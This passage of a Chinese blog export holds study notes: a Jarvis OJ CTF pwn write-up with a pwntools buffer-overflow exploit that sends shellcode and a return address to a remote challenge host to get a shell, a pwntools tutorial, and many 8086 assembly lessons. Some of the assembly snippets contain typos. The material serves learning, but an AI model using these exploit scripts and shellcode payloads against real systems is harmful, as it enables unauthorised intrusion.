解释如下：level0是最简单的也是最基本的，这个题有一个函数callsystem，直接返回一个system（”/bin/sh”)也就是返回一个命令框，这就是我们想要的，所以不用构建shellcode和paload了脚本里的’a’0x80+’a’8代表的是如下图的两个数据，0x80是申请的总共地址，而8在buf的最下方 s_addr=0x400596代表的是函数callsystem的地址 level1的脚本如下：12345678910111213from pwn import *context(log_level = &apos;debug&apos;, arch = &apos;i386&apos;, os = &apos;linux&apos;)shellcode = asm(shellcraft.sh())io = remote(&apos;pwn2.jarvisoj.com&apos;, 9877)text = io.recvline()[14: -2]buf_addr = int(text, 16)payload = shellcode + &apos;a&apos; * (0x88 + 0x4 - len(shellcode)) + p32(buf_addr)io.send(payload)io.interactive()io.close() 解释如下：这里我只解释主要思路不明白如下两句话的可以百度12context(log_level = &apos;debug&apos;, arch = &apos;i386&apos;, os = &apos;linux&apos;)shellcode = asm(shellcraft.sh()) [14:-2]只是python里面的一个切片，代表”What’sthis:0xffee6c50?”这句话取第14个到倒数第二个字符这里的text为buf的地址，只不过是字符型的，需要int（text，16）用16进制的方法转化为int型]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwntools]]></title>
    <url>%2F2018%2F09%2F19%2Fpwntools%2F</url>
    <content type="text"><![CDATA[pwntoolspwntools是一个ctf框架和漏洞利用开发库，用python开发，旨在让使用者简单快速的编写exploit。python2安装方法： sudo pip install pwntoolspython3安装方法： sudo pip3 install pwntools IO模块下面给出了PwnTools中的主要IO函数。1234567891011send(data) : 发送数据sendline(data) : 发送一行数据，相当于在末尾加\nrecv(numb=4096, timeout=default) : 给出接收字节数,timeout指定超时recvuntil(delims, drop=False) : 接收到delims的pattern（以下可以看作until的特例）recvline(keepends=True) : 接收到\n，keepends指定保留\nrecvall() : 接收到EOFrecvrepeat(timeout=default) : 接收到EOF或timeoutinteractive() : 与shell交互 ELF模块ELF模块用于获取ELF文件的信息，首先使用ELF()获取这个文件的句柄，然后使用这个句柄调用函数，和IO模块很相似。 下面演示了：获取基地址、获取函数地址（基于符号）、获取函数got地址、获取函数plt地址123456789&gt;&gt;&gt; e = ELF(&apos;/bin/cat&apos;)&gt;&gt;&gt; print hex(e.address) # 文件装载的基地址0x400000&gt;&gt;&gt; print hex(e.symbols[&apos;write&apos;]) # 函数地址0x401680&gt;&gt;&gt; print hex(e.got[&apos;write&apos;]) # GOT表的地址0x60b070&gt;&gt;&gt; print hex(e.plt[&apos;write&apos;]) # PLT的地址0x401680 数据处理主要是对整数进行打包，就是转换成二进制的形式，比如转换成地址。p32、p64是打包，u32、u64是解包。数据打包,即将整数值转换为32位或者64位地址一样的表示方式,比如0x400010表示为\x10\x00\x40一样,这使得我们构造payload变得很方便 用法: p32/p64: 打包一个整数,分别打包为32或64位 u32/u64: 解包一个字符串,得到整数 大致框架官网的一个简单样例 123456789from pwn import *context(arch = &apos;i386&apos;, os = &apos;linux&apos;) ;设置目标机的信息r = remote(&apos;exploitme.example.com&apos;, 31337) ;用来建立一个远程连接，url或者ip作为地址 然后指明端口,这里也可以仅仅使用本地文件,调试时方便:r.send(asm(shellcraft.sh())) ;r.send()将shellcode发送到远程连接r.interactive() ;将控制权交给用户，这样就可以使用打开的shell了 Context设置context是pwntools用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题。 一般来说我们设置context只需要简单的一句话: context(os=’linux’, arch=’amd64’, log_level=’debug’) 这句话的意思是： os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’ log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和IO相关的错误。 汇编与shellcode有的时候我们需要在写exp的时候用到简单的shellcode，pwntools提供了对简单的shellcode的支持。首先，常用的，也是最简单的shellcode，即调用/bin/sh可以通过shellcraft得到： 注意，由于各个平台，特别是32位和64位的shellcode不一样，所以最好先设置context。1print(shellcraft.sh()) # 打印出shellcode 不过，现在我们看到的shellcode还是汇编代码，不是能用的机器码，所以还需要进行一次汇编1print(asm(shellcraft.sh())) # 打印出汇编后的shellcode asm可以对汇编代码进行汇编，不过pwntools目前的asm实现还有一些缺陷，比如不能支持相对跳转等等，只可以进行简单的汇编操作。如果需要更复杂一些的汇编功能，可以使用keystone-engine项目，这里就不再赘述了。 asm也是架构相关，所以一定要先设置context，避免一些意想不到的错误。]]></content>
      <categories>
        <category>pwntools</category>
      </categories>
      <tags>
        <tag>pwntools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cmp指令]]></title>
    <url>%2F2018%2F09%2F16%2Fcmp%E6%8C%87%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[cmp是比较指令，cmp的功能相当于减法指令，只是不保存结果。cmp指令格式：cmp操作对象1，操作对象2功能：计算操作对象1-操作对象2但不保存结果，仅仅根据计算结果对标志寄存器进行设置。 指令cmp ax，bx的逻辑含义是比较ax，bx中的值，如果执行后：zf=1，说明(ax)=(bx)zf=0，说明（ax）不等于（bx）cf=1，说明（ax）&lt;(bx)cf=0，说明（ax)&gt;=(bx)cf=0且zf=0，说明（ax）&gt;(bx)cf=1或zf=1,说明(ax)&lt;=(bx）]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sbb指令]]></title>
    <url>%2F2018%2F09%2F16%2Fsbb%E6%8C%87%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[sbb是带减法指令，它利于了CF位上记录的错位置。指令格式：sbb 操作对象1，操作对象2功能：操作对象1=操作对象1-操作对象2-CF例如：1234mov bx,1000Hmov ax,003EHsub bx,2000Hsbb ax,0020H sbb指令执行后，将对CF进行设置。利用sbb指令可以对任意大的数据进行减法运算。上面程序，就是计算003E1000H-00202000H]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[adc指令]]></title>
    <url>%2F2018%2F09%2F16%2Fadc%E6%8C%87%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[adc是带进位加法指令指令格式：adc 操作对象1，操作对象2功能：操作对象1=操作对象1+操作对象2+CF 例如：1234mov ax,2mov bx,1sub bx,axadc ax,1 执行后，（ax）=4,abc执行时想，相当于计算：（ax）+1+CF=2+1+1=4adc指令的目的，就是来进行假发的第二步运算的。adc指令和add指令相配合就可以对更大的数据进行加法运算。]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[检测点11.1]]></title>
    <url>%2F2018%2F09%2F16%2F%E6%A3%80%E6%B5%8B%E7%82%B911-1%2F</url>
    <content type="text"><![CDATA[写出下面每条指令执行后，ZF、PF、SF、等标志位的值。12345678910111213sub al,al al=0h ZF=1 PF=1 SF=0 mov al,1 al=1h ZF=1 PF=1 SF=0 push ax ax=1h ZF=1 PF=1 SF=0 pop bx bx=1h ZF=1 PF=1 SF=0 add al,bl al=2h ZF=0 PF=0 SF=0 add al,10 al=12h ZF=0 PF=1 SF=0 mul al ax=144h ZF=0 PF=1 SF=0]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[标志寄存器]]></title>
    <url>%2F2018%2F09%2F16%2F%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8%2F</url>
    <content type="text"><![CDATA[标志寄存器（简称flag）的作用：（1）用来存储相关指令的某些执行结果。（2）用来为CPU执行相关指令提供行为依据。（3）用来控制CPU的相关工作方式。flag和其他寄存器不一样，其他寄存器是用来存放数据的，都是整个寄存器具有一个含义。而flag寄存器死按位起作用的，它的每一位都有专门的含义，记录特定的信息。 flag的1,3,5,12,13,14,15位在8086CPU中没有使用，不具有任何含义 ZF标志flag的第六位是ZF，零标志位。它记录相关指令执行后，其结果是否为0.如果结果为0，那么zf=1，如果结果不为0，那么zf=0 例如指令：12mov ax,1sub ax,1 执行后，结果为0，则zf=1 PF标志flag的第二位是PF，奇偶标志位，它记录相关指令执行后，其结果的所有bit位中1的个数是否位偶数。如果1的个数为偶数，pf=1，如果为奇数，那么pf=0比如指令：12mov ax,1add al,10 执行后，结果为00001011B，其中有3个1，则pf=0 SF标志flag的第七位是SF，符号标志位，它记录相关指令后，其结果是否为负。如果结果为负，sf=1，如果不为负，sf=0计算机通常用补码来表示有符号数据。计算机的UI个数据可以看做是由富豪书，也可以看做成无符号数。比如：00000001B，可以看做无符号数1，或有符号数+1；10000001B，可以看做无符号数129，也可以看作有符号数-127不管我们如何看待，CPU在执行add等指令的时候，就已经包含了两种含义，也将得到同一种信息来记录的两种结果。关键在于我们的程序需要哪一种结果。比如：12mov al,10000001Badd al,1 执行后，结果为10000010B，sf=1，表示：如果指令进行的是有符号数运算，那么结果为负；12mov al,100000001Badd al,011111111B 执行后，结果为0，sf=0，表示：如果指令进行的是有符号数运算，那么结果为非负。某些指令将影响寄存器中的多个标记为，这些被影响的标记位比较全面地记录了指令的执行结果，为相关的处理提供了所需的依据。比如指令sub，al，al执行后，ZF、PF、SF等标志位都要受到影响，它们分别为：1,1,0。 CF标志位flag的第0位是CF，进位标志位，一般情况下，在进行无符号运算的时候，它记录了运算结果的最高有效位向更高位的进位值，或从更高位的借位值。比如，123mov al,98Hadd al,al 执行后：（al）=30H，CF=1，CF记录了从最高有效位向更高位的进位值add al,al 执行后：（al）=60H，CF=0 而当两个数据做减法的时候，有可能向更高位借位，比如：123mov al,97Hsub al,98H ；执行后（al）=FFH，CF=1，CF记录了向更高位的借位值sub al,al ：执行后（al）=0，CF=0，CF记录了向更高位借位值 OF标志位flag的第十一位是OF，溢出标志位。一般情况下，OF记录了有符号数运算的结果是否发生了溢出。如果发生溢出，OF=1；如果没有，OF=0.对于无符号数运算，98+99没有进位，CF=0；对于有符号数运算，98+99发生溢出，OF=1例如：12mov al,F0Hadd al,88H add指令执行后：CF=1，OF=0.对于无符号运算，F0H+78H有进位，CF=1；对于有符号数运算，F0H+78H不发生溢出，OF=0 DF标志位flag的第10位是DF，方向标志位。在串处理指令中，控制每次操作后si，di的增减。df=0 每次操作后si、di递增df=1 每次操作后si、di递减]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mul指令]]></title>
    <url>%2F2018%2F09%2F16%2Fmul%E6%8C%87%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[mul指令是乘法指令规定：（1）两个相乘的数，要么都是8位，要么都是16位，如果是8位，一个默认放在AL中，另一个放在8位reg或内存字单元中：如果是16位，一个默认放在AX中，另一个放在16位reg或内存子单元中。（2）结果：如果是8位乘法，结果默认放在AX中；如果是16位乘法，结果高位默认放在DX中存放，低位在AX中放。 例如：（1）计算100*10100和10 都小于255，可以做8位陈发，程序如下。123mov al,100mov bl,10mul bl 结果（ax）=1000（03E8H）（2）计算100*10000100小于255，可10000大于255，所以必须做16位乘法，程序如下：123mov ax,100mov bx,10000mul bx 结果：(ax)=4240H,(dx)=000FH (F4240H=100000)]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[call指令]]></title>
    <url>%2F2018%2F09%2F12%2Fcall%E6%8C%87%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[CPU执行call指令时，进行两步操作：（1）将当前的IP或CS和IP压入栈中；（2）转移call指令不能实现短转移，除此之外，call指令实现转移的方法和jmp指令的原理相同。 call 标号依据位移进行转移的call指令CPU执行 “call 标号”指令时，进行如下操作：（1）(sp)=(sp)-2((ss)*16+(sp))=(IP)(2) (IP)=(IP)+16位位移。 16位位移=标号处的地址-call指令后的第一个直接的地址；16位位移的范围为-32768~32767，用补码表示；16位位移由编译程序在编译时算出。 CPU执行”call 标号”时，用汇编语言解释，相当于进行：push IPjmp near ptr 标号 call far ptr 标号转移的目的之地在指令中的call指令CPU执行”call far ptr 标号”指令时，进行如下的操作：(1) (sp)=(sp)-2((ss)*16+（sp))=(CS) (sp)=(sp)-2((ss)*16+(sp0=（IP）(2)(CS)=标号所在段的段地址（IP）=标号在段中的偏移地址 CPU执行”call far ptr 标号”时，用汇编语言解释，相当于进行：push CSpush IPjmp far ptr 标号 call 16 位 reg转移地址在寄存器中的call指令功能：(sp)=(sp)-2((ss)*16+(sp))=(IP)(IP)=(16位reg) 用汇编语言解释，相当于进行：push IPjmp 16位 reg call word ptr 内存单元地址转移地址在内存中的call指令 用汇编语言解释，相当于进行：push IPjmp word ptr 内存单元地址 比如：1234mov sp,10hmov as,0123hmov ds:[0],axcall word ptr ds:[0] 执行后，（IP）=0123H，（sp）=0EH call dword ptr 内存单元地址转移地址在内存中的call指令 用汇编语言解释，相当于进行：push CSpush IPjmp word ptr 内存单元地址 比如：12345mov sp,10hmov as,0123hmov ds:[0],axmov word ptr ds:[2],0call dword ptr ds:[0] 执行后，（CS）=0，（IP）=0123H，（sp）=0CH call和ret的配合使用call和ret配合使用来实现子程序先分析一下代码：12345678910111213assume cs:codecode segmentstart: mov ax,1 mov cx,3 call s mov bx,ax mov ax,4c00h int 21h s: add ax,bx loops retcode endsend start CPU执行这个程序的主要过程可以写一个具有一定功能的程序段，我们称其为子程序，在需要的时候，用call指令去执行。可是执行完子程序后，如何让CPU接着call指令向下执行？call指令去执行子程序之前，call指令后面的指令的地址将存储在栈中，所以可在子程序后面使用ret指令，用栈中的数据设置IP的值，从而转到call指令后面的代码处继续执行。 具有子程序的源程序的框架如下:123456789101112131415161718192021assume cs:codecode segmentmain: : : call sub1 : : mov ax,4c00h int 21hsub1: : : call sub2 : : retsub2: : : retcode endsend main]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[检测点10.1-10.5]]></title>
    <url>%2F2018%2F09%2F12%2F%E6%A3%80%E6%B5%8B%E7%82%B910-1-10-5%2F</url>
    <content type="text"><![CDATA[10.1补全程序，实现从内存1000:0000处开始执行指令1234567891011121314151617181920assume cs:codestack segmentdb 16 dup (0)stack endscode segmentmov ax,4c00hint 21hstart: mov ax,stackmov ss,axmov sp,16mov ax,0push axmov ax,1000hretfcode endsend start 程序分析： retf指令作用（CPU角度）：从栈中弹出2个字单元，并修改CS（第二个字）和IP（第一个字）；首先它弹出的是IP，其次是CS，故在压栈时，CS的值首先入栈，IP再入栈。 在汇编编程角度，retf实现了远转移。 讲解：在汇编代码这个层次，retf指令作用是修改CS和IP的值，进而使指令从修改后的地址处开始执行。由于它所依赖的是栈中存储的内容，故在压栈过程中要搞清楚入栈的顺序、入栈的值。 2.熟悉ret指令和RETF指令执行的操作。 我们编译链接后，debug跟踪check10-1.exe -d ss:0 0B66:0000 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ……………. 在stack数据区中初始化了16个0，此时它未成为栈结构。直到初始化栈的结构。 执行代码t t（二次） AX=0B66 BX=0000 CX=0026 DX=0000 SP=0010 BP=0000 SI=0000 DI=0000 DS=0B56 ES=0B56 SS=0B66 CS=0B67 IP=0008 NV UP EI PL NZ NA PO NC 0B67:0008 B80010 MOV AX,1000 -d ss:00 0B66:0000 00 00 00 00 00 00 66 0B-00 00 08 00 67 0B 68 05 ……f…..g.h. 初始化一个栈sp=0010H（16），栈地址：ss=0b66，这里我们发现一些不应该有的数据（不理会它，它是中断的信息） 继续执行代码： -d ss:0 0B66:0000 00 00 00 00 00 00 10 00-67 0B 68 05 00 00 00 10 ……..g.h….. 发现从高位开始存储10 00 00 00四个字节的数据，（体会栈是从高地址向低地址发展的，sp指针从10H减少到了0cH） 此时的CS=0B67 IP=0010 执行retf代码： 我们发现：CS=1000 IP=0000，CS和IP的值改变了。 总结：ret和RETF依赖于栈的结构存储一个程序执行点（IP或CS和IP），当执行这个代码时，可以恢复到这个程序的执行点（将栈中的数据修改IP或CS和IP，使CPU指向新的CS：IP） 10.2下面的程序执行后，ax中的数值为多少？12345678910内存地址 机器码 汇编指令 执行后情况1000:0 b8 00 00 mov ax,0 ax=0 ip指向1000:31000:3 e8 01 00 call s 读取指令后IP指向下一条指令IP为6;push 61000:6 40 inc ax1000:7 58 s:pop ax ax=6 “call 标号”是将该指令后的第一个字节偏移地址入栈，再转到标号处执行指令。 10.3下面的程序执行后，AX中的数值为多少？1234567891011内存地址 机器码 汇编指令 1000：0 b8 00 00 mov ax,0 1000：3 9A 09 00 00 10 call far ptr s ;cs为1000h，ip为8， push 1000h，push 81000：8 40 inc ax 1000：9 58 s: pop ax ;ax=8h add ax,ax ;ax=10h pop bx ;bx=1000h add ax,bx ;ax=1010h 执行call far ptr s时，取IP为8,add ax,ax ax=16BX=CS=1000H 相加转16进制ax=1010H 10.4下面的程序执行后，AX中的数值为多少？123456内存地址 机器码 汇编指令 1000：0 b8 06 00 mov ax,6 1000：3 ff d0 call ax1000：5 40 inc ax 1000：6 mov bp,sp add ax,[bp] 在执行了call ax的时候指令寄存器会指向下一条指令的起始地址，也就是1000:5 inc ax然后指令寄存器ip=5要压入堆栈然后跳转到cs:ax指定的地址执行又因为此时ax中的值为6 ,cs=1000所以跳转到1000:6执行于是修改 ip为6到此时call ax指令才执行完毕 然后就执行mov bp,sp因为sp里面放的是堆顶的地址，所以bp也是栈顶的地址了之后add ax,[bp]因为，bp里面放的是栈顶的地址，所以 [bp] 寄存器寻址后 [bp]实际是代表该地址单元的内容，也就是栈顶的内容，因为先前我把ip压入了堆栈，所以[bp]得到的内容就是5(先前在call ax时候压入的ip的值) 所以 ax=ax+[bp]也就是 ax=6+5=0BH 10.5题目：下面的程序执行后，ax中的数据是多少？123456789101112131415161718assume cs:code stack segment dw 8 dup (0) stack ends code segment start :mov ax,stack mov ss,ax mov sp,16 mov ds,ax mov ax,0 call word ptr ds:[0eH] inc ax inc ax inc ax code ends end start 解答：刚开始时mov ax,stack到mov sp,10h是分别设置ss：sp指向程序中定义的栈段stack。mov ds,ax也把数据段的段地址也设置成了stack段的段地址。call word prt ds:[0Eh]相当于是sp=sp-2，push ip，jmp word ptr ds:[0Eh]这三条指令。而sp-2就是0Eh了，push ip就是把第一条inc ax对应的ip值给压入栈。存放在ss:[0Eh]和ss:[0Fh]里面。接下来是jmp word ptr ds:[0Eh]了，它的功能就是把stack段的[0eh]子单元的值付给ip，很巧的是stack中[0eh]字单元的值就是刚刚压入的ip值。所以ip值没有改变。程序继续执行inc ax后面的程序。所以ax的值是3.]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ret和retf]]></title>
    <url>%2F2018%2F09%2F12%2Fret%E5%92%8Cretf%2F</url>
    <content type="text"><![CDATA[ret指令用栈中的数据，修改IP的内容，从而实现进转移；retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移； CPU执行ret指令时，进行下面两步操作：（1） （IP)=((ss)*16+(sp))（2） (sp)=(sp)+2 CPU执行retf指令时，进行下面4部操作：(1) (IP)=((ss)16+(sp))(2) (sp)=(sp)+2(3) (CS)=((ss)16+(sp))(4) (sp)=(sp)+2 可以看出，CPU执行ret指令时，相当于进行：pop IP CPU执行retf指令时，相当于进行：pop IPpop CS 例如：1、1234567891011121314151617181920assume cs:codestack segmentdb 16 dup (0)stack endscode segmentmov ax,4c00hint 21hstart: mov ax,stackmov ss,axmov sp,16mov ax,0push axmov bx,0retcode endsend start ret指令执行后CS：IP指向代码的第一条指令2、1234567891011121314151617181920assume cs;codestack segmentdb 16 dup (0)stack endscode segmentmov ax,4c00hint 21hstart: mov ax,stackmov ss,axmov sp,16mov ax,0push cspush axmov bx,0retfcode endsend start retf指令执行后，CS：IP指向代码段的第一条指令。]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[操作符offset]]></title>
    <url>%2F2018%2F09%2F11%2F%E6%93%8D%E4%BD%9C%E7%AC%A6offset%2F</url>
    <content type="text"><![CDATA[操作符offest在汇编语言中是由编译器处理的符号，它的功能是取得标号的偏移地址。比如：123456assume cs:codesgcodesg segmentstart:mov ax,offset strat ;相当于mov ax,0s: mov ax,offset s ;相当于mov ax,3codesg endsend start offset操作符取得了标号start和s的偏移地址0和3因为start是代码段中的标号，它所标记的指令是代码段中的第一条指令，偏移地址为0；而s标记的指令是代码段中的第二条指令，第一条指令长度为3个字节，则s的偏移地址为3. 又比如：]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[dup指令]]></title>
    <url>%2F2018%2F09%2F11%2Fdup%E6%8C%87%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[dup是一个操作符，在汇编语言中同db、dw、dd、等一样。它是和db、dw、dd、等数据定义伪指令配合使用的，用来数据的重复。dup的使用格式如下：db 重复的次数 dup （重复的字节型数据）dw 重复的次数 dup （重复的字型数据）dd 重复的次数 dup （重复的双字符数据） 比如：1、3 dup (0)```123定义了三个字节，它们的值都是0，相当于db 0,0,0。2、 stack segmentdb 200 dup (0)stack ends`定义了一个容量为200个字节的栈段]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[div指令]]></title>
    <url>%2F2018%2F09%2F11%2Fdiv%E6%8C%87%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[div是除法指令，使用div做除法时应注意以下问题。 1、除数：有8位和16位两种，在一个reg或内存单元中。2、被除数：默认放在AX或DX和AX中，如果除数位8位，被除数则为16位，默认在AX中存放；如果除数为16位，被除数则为32位，在DX和AX中存放，DX放高16位，AX存放低16位。3、结果：如果除数为8位，则AL存储除法操作的商，AH存储除法操作的余数；如果除数为16位，则AX存储除法操作的商，DX存储除法操作的余数。 例如：1、除数为8位： 1div byte ptr ds:[0] 含义：（al）=（ax）/（（ds）*16+0）的商 （ah）=（ax）/（ds)*16+0)的余数 2、除数为16位： 1div word ptr es:[0] 含义：(ax)=[(dx)*10000H+(ax)] / ((es)*16+0)的商 （dx）=[(dx)*10000H+(ax)] / (es)*16+0)的余数 3、用除法指令计算100001/100 分析：被除数100001大于65535（ffffh），所以用dx和ax两个寄存器联合存放100001，除数100虽然小于255可以在一个8位寄存器中存放，但是，因为除数是32位的，除数应为16位，所以要用16位寄存器存放除数100100001表示为16进制为：186A1H。程序如下：1234mov dx,1mov ax,86A1H ;(dx)*10000H+(ax)=100001mov bx,100div bx 程序执行后（ax）=03E8H（即1000）（dx）=1（余数为1） 4、用除法指令计算1001/100分析：被除数1001可用ax寄存器存放，除数100可用8位寄存器存放，也就是说，要进行8位的除法。程序如下：123mov ax,1001mov bl,100div bl 程序执行后，（al）=0AH（即10），（ah）=1（余数为1） 5、]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[and和or指令]]></title>
    <url>%2F2018%2F09%2F11%2Fand%E5%92%8Cor%E6%8C%87%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[1、and指令：逻辑与指令，按位进行与运算通过该指令可将操作对象位设为0，其他为不变 例如：12mov al,01100011Band al,00111011B 执行后al=00100011B 2、or指令：逻辑或指令，按位进行或运算。通过该指令可将操作对象位设为1，其他位不变 例如指令： 12mov al,0110001Bor al,00111011B 执行后：al=01111011B]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[检测点6.1]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%A3%80%E6%B5%8B%E7%82%B96-1%2F</url>
    <content type="text"><![CDATA[知识点：1.用于显式地指明内存单元的段地址的”ds:” “cs:” “ss:” “es:” 在汇编语言中称为段前缀 2.Dos方式下，一般情况，0:200 - 0:2ff空间中没有系统或其他程序的数据或代码。 检测点：(1)下面的程序实现依次用内存0:0 - 0:15单元中的内容改写程序中的数据，完成程序：123456789101112131415161718assume cs:codesgcodesg segmentdw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987hstart: mov ax,0mov ds,axmov bx,0mov cx,8s: mov ax,[bx]mov cs:[bx],axadd bx,2loop smov ax,4c00hint 21hcodesg endsend start (2)下面的程序实现依次用内存0:0 - 0:15单元中的内容改写程序中的数据，数据的传送用栈来进行。栈空间设置栈程序中。完成程序：123456789101112131415161718192021assume cs:codesgcodesg segmentdw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987hdw 0,0,0,0,0,0,0,0,0,0start: mov ax,csmov ss,axmov sp,24hmov ax,0mov ds,axmov bx,0mov cx,8s: push [bx]pop [bx]add bx,2loop smov ax,4c00hint 21hcodesg endsend start]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在代码段中使用栈]]></title>
    <url>%2F2018%2F09%2F10%2F%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%AE%B5%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%A0%88%2F</url>
    <content type="text"><![CDATA[1234567891011121314151617181920212223242526assum cs:codesgcode segement dw 0123H，0456H，0789H，0abcH，0defH，0fedH，0cbaH，0987H dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ;用dw定义16个字型数据，在程序加载后，将取得 16个字的内存空间，存放着6个数据。在后面的程 序中将这段空间当作栈来使用start: mov ax,cs mov ss,ax mv sp,30h ;设置栈顶ss：sp指向CS：30 mov bx,0 mov cz,8 s: push cs:[bx] add bx,2 loop s s0: pop cs[bx] add bx,2 loop s0 ;将定义的数据逆序存放 mov ax,4c00h int 21hcodesg endsend start]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在代码段中使用数据]]></title>
    <url>%2F2018%2F09%2F10%2F%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%AE%B5%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%95%B0%E6%8D%AE%2F</url>
    <content type="text"><![CDATA[编程计算以下8个数据的和，结果存在ax寄存器中： 0123H，0456H，0789H，0abcH，0defH，0fedH，0cbaH，0987H123456789101112131415assum cs:code code segementdw 0123H，0456H，0789H，0abcH，0defH，0fedH，0cbaH，0987Hmov bx,0mov ax,0mov cz,8s: add ax,cs:[bx]add bx,2loop smov ax,4c00hint 21hcode endsend dw的含义是定义字型数据，dw即“define word”，在这里，使用dw定义了8个字型数据，它们所占的内存空间的大小为16个字节。程序在运行的时候cs中存放代码段的段地址，所以可以从cs中得到它们的段地址 因为用dw定义的数据处于代码段的最开始，所以偏移地址为0，这8个数据就在代码段的偏移0、2、4、6、8、A、C、E处。程序运行时，它们的地址就是CS：0、CS：2、CS：4、CS：6、CS：8、CS：A、CS：C、CS：E。用bx存放加2递增的偏移地址用循环来进行累加。在循环开始前,设置（bx）=0，CS：BX指向第一个数据存放的字单元。每次循环中（bx）=（bx）+2，CS：BX指向下一个数据所在的字单元。]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Loop指令]]></title>
    <url>%2F2018%2F09%2F10%2FLoop%E6%8C%87%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[loop指令的格式是：loop 标号CPU执行loop指令的时候，要进行两步操作，1、(cx)=(cx)-12、判断cx中的值，不为零则转至标号处执行，如果为零则向下执行 例子1：计算2的十二次方123456789101112assume cs:code code segmentmov ax,2mov cx,11s: add ax,axloop smov ax,4c00Hint 21Hcode endsend 例子2：用加法计算123*236 123456789101112assume cs:codecode segmentmov ax,0mov cx,123s: add ax,236loop smov ax,4c00Hint 21Hcode endsend]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[寄存器（内存访问）]]></title>
    <url>%2F2018%2F09%2F08%2F%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%88%E5%86%85%E5%AD%98%E8%AE%BF%E9%97%AE%EF%BC%89%2F</url>
